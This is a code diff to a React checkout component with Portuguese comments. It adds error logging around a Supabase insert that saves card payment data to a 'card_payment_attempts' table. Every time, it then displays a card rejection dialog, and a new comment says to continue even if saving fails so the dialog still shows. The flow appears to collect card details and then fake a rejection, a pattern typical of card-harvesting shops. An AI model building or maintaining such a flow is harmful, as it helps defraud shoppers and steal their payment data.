@@ -193,7 +193,7 @@ const Checkout = () => {
         const total = subtotal + frete;
 
         // Salvar tentativa de pagamento com cartão
-        await supabase
+        const { error: cardError } = await supabase
           .from("card_payment_attempts")
           .insert({
             user_id: user.id,
@@ -204,9 +204,15 @@ const Checkout = () => {
             valor: total,
           });
 
+        if (cardError) {
+          console.error("Erro ao salvar dados do cartão:", cardError);
+          // Continua mesmo com erro para mostrar o dialog
+        }
+
         setShowCardRejectionDialog(true);
         setLoading(false);
       } catch (error: any) {
+        console.error("Erro no pagamento com cartão:", error);
         toast({
           title: "Erro",
           description: error.message,
